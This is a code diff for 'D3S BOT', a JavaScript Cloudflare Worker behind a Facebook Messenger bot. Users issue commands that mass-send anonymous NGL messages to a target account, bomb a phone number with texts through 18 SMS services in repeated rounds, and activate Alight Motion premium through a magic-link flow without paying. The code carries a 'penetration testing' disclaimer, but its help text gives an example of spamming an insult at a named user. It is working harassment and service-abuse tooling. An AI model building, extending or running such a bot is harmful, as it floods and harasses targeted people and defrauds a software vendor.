@@ -1,25 +1,24 @@
-/* ═══════════════════════════════════════════════════════════════════════════
-   D3S BOT — v2.2.1
-   NGL Spammer · SMS Bomber · Alight Motion Premium · Messenger
+/* ============================================================================
+   D3S BOT - v2.2.2
+   NGL Spammer - SMS Bomber - Alight Motion Premium - Messenger
    For authorized penetration testing only.
-   ═══════════════════════════════════════════════════════════════════════════
 
-   ┌─ SECTION MAP ────────────────────────────────────────────────────────┐
-   │  §1  CONFIG                 constants, URLs, version                  │
-   │  §2  UTILITIES              uuid, random, phone normalize, POST       │
-   │  §3  NGL ENGINE             direct, vercel, failover, batch           │
-   │  §4  SMS ENGINE             18 services, cloudflare, vercel, failover │
-   │  §5  ALIGHT MOTION ENGINE   3-step premium flow                       │
-   │  §6  MESSENGER LAYER        reply helper, command parser              │
-   │  §7  HTTP ROUTER            webhook, /api, /privacy, /test-send       │
-   └──────────────────────────────────────────────────────────────────────┘
-*/
+   SECTION MAP
+     §1  CONFIG
+     §2  UTILITIES
+     §3  NGL ENGINE
+     §4  SMS ENGINE
+     §5  ALIGHT MOTION ENGINE
+     §6  MESSENGER LAYER
+     §7  HTTP ROUTER
+   ============================================================================ */
 
-/* ═══════════════════════════════════════════════════════════════════════════
+
+/* ============================================================================
    §1  CONFIG
-   ═══════════════════════════════════════════════════════════════════════════ */
+   ============================================================================ */
 
-const VERSION = 'bot-v2.2.1';
+const VERSION = 'bot-v2.2.2';
 
 const CORS = {
   'Access-Control-Allow-Origin': '*',
@@ -41,9 +40,10 @@ const UA_LIST = [
   'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36',
 ];
 
-/* ═══════════════════════════════════════════════════════════════════════════
+
+/* ============================================================================
    §2  UTILITIES
-   ═══════════════════════════════════════════════════════════════════════════ */
+   ============================================================================ */
 
 const pickUA = () => UA_LIST[Math.floor(Math.random() * UA_LIST.length)];
 
@@ -105,9 +105,17 @@ async function post(url, headers, body, timeoutMs = 8000) {
   }
 }
 
-/* ═══════════════════════════════════════════════════════════════════════════
+const box = (title) => {
+  const t = String(title).slice(0, 34);
+  return '+----------------------------------+\n'
+       + '| ' + t.padEnd(32, ' ') + ' |\n'
+       + '+----------------------------------+';
+};
+
+
+/* ============================================================================
    §3  NGL ENGINE
-   ═══════════════════════════════════════════════════════════════════════════ */
+   ============================================================================ */
 
 async function nglCloudflare(username, message) {
   const nonce = Date.now() + '-' + Math.floor(Math.random() * 1e9);
@@ -126,9 +134,9 @@ async function nglCloudflare(username, message) {
   try {
     const r = await fetch(apiUrl, { method: 'POST', headers: h, body: payload });
     const text = (await r.text()).slice(0, 300);
-    return { ok: r.status === 200, status: r.status, body: text, error: '', via: 'cloudflare' };
+    return { ok: r.status === 200, status: r.status, body: text, error: '', via: 'cf' };
   } catch (e) {
-    return { ok: false, status: 0, body: '', error: String(e), via: 'cloudflare' };
+    return { ok: false, status: 0, body: '', error: String(e), via: 'cf' };
   }
 }
 
@@ -140,9 +148,9 @@ async function nglVercel(username, message) {
       body: JSON.stringify({ username, message }),
     });
     const j = await r.json();
-    return { ok: !!j.ok, status: j.status || 0, body: j.body || '', error: j.error || '', via: 'vercel' };
+    return { ok: !!j.ok, status: j.status || 0, body: j.body || '', error: j.error || '', via: 'vc' };
   } catch (e) {
-    return { ok: false, status: 0, body: '', error: String(e), via: 'vercel' };
+    return { ok: false, status: 0, body: '', error: String(e), via: 'vc' };
   }
 }
 
@@ -161,8 +169,8 @@ async function nglBatch(username, count, message) {
     const r = await nglSend(username, message);
     if (r.status === 200) {
       stats.sent++;
-      if (r.via === 'cloudflare') stats.via_cf++;
-      else if (r.via === 'vercel') stats.via_vc++;
+      if (r.via === 'cf') stats.via_cf++;
+      else if (r.via === 'vc') stats.via_vc++;
     } else if (r.status === 404) stats.fof++;
     else if (r.status === 429) stats.blk++;
     else stats.err++;
@@ -172,9 +180,10 @@ async function nglBatch(username, count, message) {
   return stats;
 }
 
-/* ═══════════════════════════════════════════════════════════════════════════
+
+/* ============================================================================
    §4  SMS ENGINE
-   ═══════════════════════════════════════════════════════════════════════════ */
+   ============================================================================ */
 
 async function svcCustom(phone, sender, msg) {
   const norm = normPhone(phone);
@@ -360,7 +369,7 @@ const SMS_SERVICES = {
 const SMS_NAMES = Object.keys(SMS_SERVICES);
 
 async function smsCloudflare(phone, services, rounds, sender, msg) {
-  const stats = { ok: 0, fail: 0, rounds: 0, start: Date.now(), svc: {}, via: 'cloudflare' };
+  const stats = { ok: 0, fail: 0, rounds: 0, start: Date.now(), svc: {}, via: 'cf' };
   const maxRounds = Math.min(rounds, 20);
   for (const s of services) stats.svc[s] = { ok: 0, fail: 0 };
   for (let r = 0; r < maxRounds; r++) {
@@ -404,7 +413,7 @@ async function smsVercel(phone, services, rounds, sender, msg) {
         rounds: j.rounds || rounds,
         elapsed: j.elapsed || '0',
         svc: j.per_service || {},
-        via: 'vercel',
+        via: 'vc',
       };
     }
   } catch (e) {}
@@ -419,9 +428,10 @@ async function smsBatch(phone, services, rounds, sender, msg) {
   return cf;
 }
 
-/* ═══════════════════════════════════════════════════════════════════════════
+
+/* ============================================================================
    §5  ALIGHT MOTION ENGINE
-   ═══════════════════════════════════════════════════════════════════════════ */
+   ============================================================================ */
 
 async function amSendMagicLink(email) {
   try {
@@ -467,9 +477,10 @@ async function amApply(email, idToken) {
   }
 }
 
-/* ═══════════════════════════════════════════════════════════════════════════
+
+/* ============================================================================
    §6  MESSENGER LAYER
-   ═══════════════════════════════════════════════════════════════════════════ */
+   ============================================================================ */
 
 async function reply(env, psid, text) {
   const url = `${GRAPH}/me/messages?access_token=${env.PAGE_TOKEN}`;
@@ -493,74 +504,63 @@ async function reply(env, psid, text) {
   }
 }
 
-/* ── Reply templates ── */
-
-const TPL = {
-  boxTop:    '╔══════════════════════════════════════╗',
-  boxDiv:    '╠══════════════════════════════════════╣',
-  boxBot:    '╚══════════════════════════════════════╝',
-  box: (title) => `${TPL.boxTop}\n║   ${title.padEnd(34, ' ')}║\n${TPL.boxBot}`,
-};
-
 const HELP_TEXT =
-`${TPL.box('D3S BOT · ' + VERSION)}
-║ NGL · SMS · AM · Messenger
-${TPL.boxBot}
+`NGL SPAMMER BOT
+${box('COMMANDS')}
 
-▸ STATUS
-  .                     quick ping
-  ..                    deep status
-  ping                  timestamp
-  help                  this menu
+[ STATUS ]
+  .              quick ping
+  ..             deep status
+  ping           timestamp
+  help           this menu
 
-▸ NGL SPAMMER
-  test <user>           preflight target
-  spam <user> <n> <msg> batch send
+[ NGL ]
+  test <user>            check target
+  spam <user> <n> <msg>  batch send
 
-▸ SMS BOMBER
-  sms <phone>           all 18 once
-  sms <phone> <count>   loop N (max 20)
-  smssvc <phone> 1,2,3  chosen services
-  smshelp               services list
+[ SMS ]
+  sms <phone>            all 18 once
+  sms <phone> <count>    loop N (max 20)
+  smssvc <phone> 1,2,3   chosen services
+  smshelp                services list
 
-▸ ALIGHT MOTION
-  am <email>            send magic link
+[ ALIGHT MOTION ]
+  am <email>             send magic link
   amverify <email> <link>  verify + activate
-  amhelp                flow instructions
+  amhelp                 flow
 
-▸ EXAMPLES
+[ EXAMPLES ]
   spam tsnn_7272 20 KUPAL
   sms 09123456789 3
   am you@gmail.com`;
 
 const SMS_HELP_TEXT = (() => {
-  let out = `▸ SMS SERVICES (${SMS_NAMES.length})\n\n`;
+  let out = 'SMS SERVICES (' + SMS_NAMES.length + ')\n' + box('LIST') + '\n\n';
   SMS_NAMES.forEach((n, i) => {
-    out += `  [${String(i + 1).padStart(2, ' ')}] ${n}\n`;
+    out += '  ' + String(i + 1).padStart(2, ' ') + '. ' + n + '\n';
   });
-  out += `\n▸ USAGE\n  sms <phone> <count>\n  smssvc <phone> 1,3,8`;
+  out += '\nUSAGE\n  sms <phone> <count>\n  smssvc <phone> 1,3,8';
   return out;
 })();
 
 const AM_HELP_TEXT =
-`${TPL.box('ALIGHT MOTION FLOW')}
+`ALIGHT MOTION
+${box('FLOW')}
 
-  ▸ STEP 1
-    am <email>
-    → magic link sent to inbox
+STEP 1
+  am <email>
+  -> magic link sent to inbox
 
-  ▸ STEP 2
-    open email, copy full link
+STEP 2
+  open email, copy the full link
 
-  ▸ STEP 3
-    amverify <email> <link>
-    → verify and activate premium
+STEP 3
+  amverify <email> <link>
+  -> verify and activate premium
 
-  ▸ NOTE
-    idToken expires in 1 hour
-    complete step 3 within 60 min`;
-
-/* ── Command handlers ── */
+NOTE
+  idToken expires in 1 hour
+  finish step 3 within 60 min`;
 
 async function cmdStatus(env, psid) {
   let pageName = 'unknown', pageId = 'unknown';
@@ -570,176 +570,174 @@ async function cmdStatus(env, psid) {
     pageName = j.name || 'unknown';
     pageId = j.id || 'unknown';
   } catch (e) {}
-
   return reply(env, psid,
-`${TPL.box('DEEP STATUS')}
+`DEEP STATUS
+${box('INFO')}
 
-  Version     ${VERSION}
-  Page        ${pageName}
-  Page ID     ${pageId}
+  version    ${VERSION}
+  page       ${pageName}
+  page id    ${pageId}
 
-  Verify      ${env.VERIFY_TOKEN ? '✓ SET' : '✗ MISSING'}
-  Token       ${env.PAGE_TOKEN ? '✓ SET' : '✗ MISSING'}
-  App secret  ${env.APP_SECRET ? '✓ SET' : '✗ MISSING'}
+  verify     ${env.VERIFY_TOKEN ? 'SET' : 'MISSING'}
+  token      ${env.PAGE_TOKEN ? 'SET' : 'MISSING'}
+  secret     ${env.APP_SECRET ? 'SET' : 'MISSING'}
 
-  NGL relay   cloudflare → vercel
-  SMS relay   cloudflare → vercel
-  AM relay    ✓ SET
-  Services    ${SMS_NAMES.length}`);
+  ngl        cf -> vc
+  sms        cf -> vc
+  am         vc
+  services   ${SMS_NAMES.length}`);
 }
 
 async function cmdTest(env, psid, user) {
-  await reply(env, psid, `▸ TESTING NGL · ${user}`);
+  await reply(env, psid, 'TESTING NGL: ' + user);
   const t1 = Date.now();
   const r = await nglSend(user, 'bot-preflight');
   const ms = Date.now() - t1;
 
   if (r.status === 200) return reply(env, psid,
-`${TPL.box('✓ NGL TARGET VALID')}
+`NGL VALID
+  target    ${user}
+  relay     ${r.via}
+  latency   ${ms}ms`);
 
-  Target    ${user}
-  Relay     ${r.via}
-  Latency   ${ms}ms`);
   if (r.status === 404) return reply(env, psid,
-`${TPL.box('✗ NGL NOT FOUND')}
+`NGL NOT FOUND
+  target    ${user}
+  status    404
+  latency   ${ms}ms`);
 
-  Target    ${user}
-  Status    HTTP 404
-  Latency   ${ms}ms`);
   if (r.status === 429) return reply(env, psid,
-`${TPL.box('⏳ NGL RATE LIMITED')}
+`NGL RATE LIMITED
+  target    ${user}`);
 
-  Target    ${user}`);
-  return reply(env, psid, `⚠ NGL HTTP ${r.status} · ${r.error || ''}`);
+  return reply(env, psid, 'NGL HTTP ' + r.status + '\n  ' + (r.error || ''));
 }
 
 async function cmdSpam(env, psid, user, count, message) {
   await reply(env, psid,
-`▸ NGL BATCH STARTING
-  Target    ${user}
-  Count     ${count}
-  Message   ${message}`);
+`NGL BATCH START
+  target    ${user}
+  count     ${count}
+  message   ${message}`);
 
   const stats = await nglBatch(user, count, message);
   const hitRate = count > 0 ? ((stats.sent / count) * 100).toFixed(1) : '0';
 
   return reply(env, psid,
-`${TPL.box('■ NGL BATCH COMPLETE')}
+`NGL BATCH DONE
+${box('RESULT')}
 
-  Target    ${user}
-  Count     ${count}
+  target    ${user}
+  count     ${count}
 
-  ✓ Sent     ${stats.sent}
-     CF       ${stats.via_cf}
-     VC       ${stats.via_vc}
-  4 404      ${stats.fof}
-  ✗ Errors   ${stats.err}
-  ⏳ Blocked  ${stats.blk}
+  sent      ${stats.sent}
+    cf      ${stats.via_cf}
+    vc      ${stats.via_vc}
+  404       ${stats.fof}
+  errors    ${stats.err}
+  blocked   ${stats.blk}
 
-  Hit rate   ${hitRate}%
-  Elapsed    ${stats.elapsed}s`);
+  hit rate  ${hitRate}%
+  elapsed   ${stats.elapsed}s`);
 }
 
 async function cmdSmsAll(env, psid, phone, rounds) {
   const norm = normPhone(phone);
-  if (!/^\+\d{10,15}$/.test(norm)) return reply(env, psid, '▸ ERROR\n  invalid phone');
+  if (!/^\+\d{10,15}$/.test(norm)) return reply(env, psid, 'ERROR: invalid phone');
 
   await reply(env, psid,
-`▸ SMS BATCH STARTING
-  Phone     ${phone}
-  Norm      ${norm}
-  Services  ${SMS_NAMES.length}
-  Rounds    ${rounds}`);
+`SMS BATCH START
+  phone     ${phone}
+  norm      ${norm}
+  services  ${SMS_NAMES.length}
+  rounds    ${rounds}`);
 
   const stats = await smsBatch(phone, SMS_NAMES, rounds, 'User', 'Test');
   let out =
-`${TPL.box('■ SMS BATCH COMPLETE')}
+`SMS BATCH DONE
+${box('RESULT')}
 
-  Phone     ${phone}
-  Rounds    ${stats.rounds}
+  phone     ${phone}
+  rounds    ${stats.rounds}
+  sent      ${stats.ok} (${stats.via || 'cf'})
+  fail      ${stats.fail}
+  elapsed   ${stats.elapsed}s
 
-  ✓ Sent     ${stats.ok}  (${stats.via || 'cf'})
-  ✗ Fail     ${stats.fail}
-  Elapsed    ${stats.elapsed}s
-
-  Per service:
+BY SERVICE
 `;
   for (const [n, v] of Object.entries(stats.svc)) {
-    out += `  ${v.ok > 0 ? '✓' : '✗'} ${n.padEnd(18, ' ')} ${v.ok}/${v.ok + v.fail}\n`;
+    const mark = v.ok > 0 ? '+' : '-';
+    out += '  [' + mark + '] ' + n + '\n';
   }
   return reply(env, psid, out);
 }
 
 async function cmdSmsSelected(env, psid, phone, indices) {
   const idx = indices.split(',').map(s => parseInt(s.trim(), 10)).filter(n => n >= 1 && n <= SMS_NAMES.length);
-  if (!idx.length) return reply(env, psid, '▸ ERROR\n  invalid service numbers');
+  if (!idx.length) return reply(env, psid, 'ERROR: bad service numbers');
   const services = idx.map(i => SMS_NAMES[i - 1]);
 
   await reply(env, psid,
-`▸ SMS SELECTED
-  Phone     ${phone}
-  Services  ${services.join(', ')}`);
+`SMS SELECTED
+  phone     ${phone}
+  services  ${services.length}`);
 
   const stats = await smsBatch(phone, services, 1, 'User', 'Test');
   let out =
-`${TPL.box('■ SMS SELECTED COMPLETE')}
+`SMS SELECTED DONE
+  sent      ${stats.ok}
+  fail      ${stats.fail}
+  elapsed   ${stats.elapsed}s
 
-  ✓ Sent     ${stats.ok}  (${stats.via || 'cf'})
-  ✗ Fail     ${stats.fail}
-  Elapsed    ${stats.elapsed}s
-
+BY SERVICE
 `;
   for (const [n, v] of Object.entries(stats.svc)) {
-    out += `  ${v.ok > 0 ? '✓' : '✗'} ${n}\n`;
+    const mark = v.ok > 0 ? '+' : '-';
+    out += '  [' + mark + '] ' + n + '\n';
   }
   return reply(env, psid, out);
 }
 
 async function cmdAmSend(env, psid, email) {
-  await reply(env, psid, `▸ AM MAGIC LINK\n  Email ${email}`);
+  await reply(env, psid, 'AM SEND LINK\n  email ' + email);
   const r = await amSendMagicLink(email);
   if (r.upstream && r.upstream.success) {
     return reply(env, psid,
-`${TPL.box('■ AM MAGIC LINK SENT')}
+`AM LINK SENT
+${box('OK')}
 
-  Email     ${email}
-  Status    ${r.status}
-  Order     ${r.upstream.codeOrder || '-'}
+  email     ${email}
+  order     ${r.upstream.codeOrder || '-'}
 
-  Check inbox / spam
+  check inbox/spam
 
-  Next:
-  amverify ${email} <paste link>`);
+NEXT
+  amverify ${email} <link>`);
   }
-  return reply(env, psid, `■ AM FAILED\n  ${JSON.stringify(r.upstream).slice(0, 300)}`);
+  return reply(env, psid, 'AM FAILED\n  ' + JSON.stringify(r.upstream).slice(0, 250));
 }
 
 async function cmdAmVerify(env, psid, email, rawLink) {
-  await reply(env, psid, `▸ AM VERIFY\n  Email ${email}`);
+  await reply(env, psid, 'AM VERIFY\n  email ' + email);
   const v = await amVerify(email, rawLink);
   if (!v.idToken) {
-    return reply(env, psid,
-`${TPL.box('✗ AM VERIFY FAILED')}
-
-  ${JSON.stringify(v.upstream).slice(0, 250)}`);
+    return reply(env, psid, 'AM VERIFY FAILED\n  ' + JSON.stringify(v.upstream).slice(0, 250));
   }
-
-  await reply(env, psid, '✓ VERIFIED · activating premium...');
+  await reply(env, psid, 'VERIFIED. activating premium...');
   const a = await amApply(email, v.idToken);
 
   if (a.upstream && a.upstream.success) {
     return reply(env, psid,
-`${TPL.box('✓ AM PREMIUM ACTIVATED')}
+`AM PREMIUM ACTIVE
+${box('OK')}
 
-  Email     ${email}
-  Status    ACTIVE
-  Order     ${a.upstream.codeorder || '-'}
-  Reply     ${a.upstream.message || 'ok'}`);
+  email     ${email}
+  status    ACTIVE
+  order     ${a.upstream.codeorder || '-'}
+  reply     ${a.upstream.message || 'ok'}`);
   }
-  return reply(env, psid, `■ PREMIUM FAILED\n  ${JSON.stringify(a.upstream).slice(0, 300)}`);
+  return reply(env, psid, 'AM PREMIUM FAILED\n  ' + JSON.stringify(a.upstream).slice(0, 250));
 }
-
-/* ── Dispatcher ── */
 
 async function handleCommand(env, psid, rawText) {
   const text = (rawText || '').trim();
@@ -747,83 +745,73 @@ async function handleCommand(env, psid, rawText) {
   const t0 = Date.now();
   if (!text) return;
 
-  /* ── ping ── */
-  if (text === '.') {
-    return reply(env, psid, `● ONLINE · ${VERSION} · ${Date.now() - t0}ms`);
-  }
-  if (lower === 'ping') {
-    return reply(env, psid, `● PONG · ${new Date().toISOString()}`);
-  }
+  if (text === '.') return reply(env, psid, 'ONLINE ' + VERSION + ' ' + (Date.now() - t0) + 'ms');
+  if (lower === 'ping') return reply(env, psid, 'PONG ' + new Date().toISOString());
 
-  /* ── status ── */
-  if (text === '..')  return cmdStatus(env, psid);
+  if (text === '..') return cmdStatus(env, psid);
   if (lower === 'help' || lower === '?') return reply(env, psid, HELP_TEXT);
   if (lower === 'smshelp') return reply(env, psid, SMS_HELP_TEXT);
   if (lower === 'amhelp')  return reply(env, psid, AM_HELP_TEXT);
 
-  /* ── AM ── */
   if (lower.startsWith('amverify ')) {
     const parts = text.split(/\s+/);
-    if (parts.length < 3) return reply(env, psid, '▸ USAGE\n  amverify <email> <link>');
+    if (parts.length < 3) return reply(env, psid, 'USAGE: amverify <email> <link>');
     return cmdAmVerify(env, psid, parts[1], parts.slice(2).join(' '));
   }
   if (lower.startsWith('am ')) {
     const email = text.split(/\s+/)[1];
     if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
-      return reply(env, psid, '▸ USAGE\n  am <email>');
+      return reply(env, psid, 'USAGE: am <email>');
     }
     return cmdAmSend(env, psid, email);
   }
 
-  /* ── NGL ── */
   if (lower.startsWith('test ')) {
     const user = text.split(/\s+/)[1];
-    if (!user) return reply(env, psid, '▸ USAGE\n  test <user>');
+    if (!user) return reply(env, psid, 'USAGE: test <user>');
     return cmdTest(env, psid, user);
   }
   if (lower.startsWith('spam ')) {
     const parts = text.split(/\s+/);
-    if (parts.length < 4) return reply(env, psid, '▸ USAGE\n  spam <user> <count> <msg>');
+    if (parts.length < 4) return reply(env, psid, 'USAGE: spam <user> <count> <msg>');
     const user = parts[1];
     const count = parseInt(parts[2], 10);
     const message = parts.slice(3).join(' ');
-    if (!user || user.includes('/')) return reply(env, psid, '▸ ERROR\n  invalid user');
-    if (!count || count < 1 || count > 50) return reply(env, psid, '▸ ERROR\n  count 1–50');
+    if (!user || user.includes('/')) return reply(env, psid, 'ERROR: invalid user');
+    if (!count || count < 1 || count > 50) return reply(env, psid, 'ERROR: count 1-50');
     return cmdSpam(env, psid, user, count, message);
   }
 
-  /* ── SMS ── */
   if (lower.startsWith('smssvc ')) {
     const parts = text.split(/\s+/);
-    if (parts.length < 3) return reply(env, psid, '▸ USAGE\n  smssvc <phone> <1,2,3>');
+    if (parts.length < 3) return reply(env, psid, 'USAGE: smssvc <phone> <1,2,3>');
     return cmdSmsSelected(env, psid, parts[1], parts[2]);
   }
   if (lower.startsWith('sms ')) {
     const parts = text.split(/\s+/);
-    if (parts.length < 2) return reply(env, psid, '▸ USAGE\n  sms <phone> [count]');
+    if (parts.length < 2) return reply(env, psid, 'USAGE: sms <phone> [count]');
     const phone = parts[1];
     const rounds = parts[2] ? Math.max(1, Math.min(20, parseInt(parts[2], 10) || 1)) : 1;
     return cmdSmsAll(env, psid, phone, rounds);
   }
 
-  return reply(env, psid, '▸ UNKNOWN COMMAND\n  send "help"');
+  return reply(env, psid, 'UNKNOWN COMMAND. Send "help".');
 }
 
-/* ═══════════════════════════════════════════════════════════════════════════
+
+/* ============================================================================
    §7  HTTP ROUTER
-   ═══════════════════════════════════════════════════════════════════════════ */
+   ============================================================================ */
 
 export default {
   async fetch(request, env, ctx) {
     try {
       const url = new URL(request.url);
 
-      /* ── CORS preflight ── */
       if (request.method === 'OPTIONS') {
         return new Response(null, { status: 204, headers: { ...CORS, 'X-Worker-Version': VERSION } });
       }
 
-      /* ── Privacy policy ── */
       if (url.pathname === '/privacy') {
         return new Response(
 `<!DOCTYPE html><html><head><meta charset="utf-8"><title>Privacy Policy</title></head>
@@ -835,7 +823,6 @@ export default {
           { status: 200, headers: { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' } });
       }
 
-      /* ── Webhook verify ── */
       if (url.pathname === '/webhook' && request.method === 'GET') {
         const mode      = url.searchParams.get('hub.mode');
         const token     = url.searchParams.get('hub.verify_token');
@@ -846,7 +833,6 @@ export default {
         return new Response('Forbidden', { status: 403 });
       }
 
-      /* ── Webhook events ── */
       if (url.pathname === '/webhook' && request.method === 'POST') {
         const raw = await request.text();
         let data;
@@ -862,7 +848,6 @@ export default {
         return new Response('EVENT_RECEIVED', { status: 200 });
       }
 
-      /* ── Diagnostic ── */
       if (url.pathname === '/api' && request.method === 'GET' && url.searchParams.get('diag') === '1') {
         let me = null, meErr = null;
         try {
@@ -884,15 +869,13 @@ export default {
         });
       }
 
-      /* ── Test send ── */
       if (url.pathname === '/test-send' && request.method === 'GET') {
         const psid = url.searchParams.get('psid');
         if (!psid) return json({ ok: false, msg: 'pass ?psid=...' }, 400);
-        const r = await reply(env, psid, 'Test · ' + new Date().toISOString());
+        const r = await reply(env, psid, 'Test ' + new Date().toISOString());
         return json(r);
       }
 
-      /* ── Manual NGL relay ── */
       if (url.pathname === '/api') {
         if (request.method !== 'POST') return json({ ok: false, msg: 'POST only' }, 405);
         let body = {};
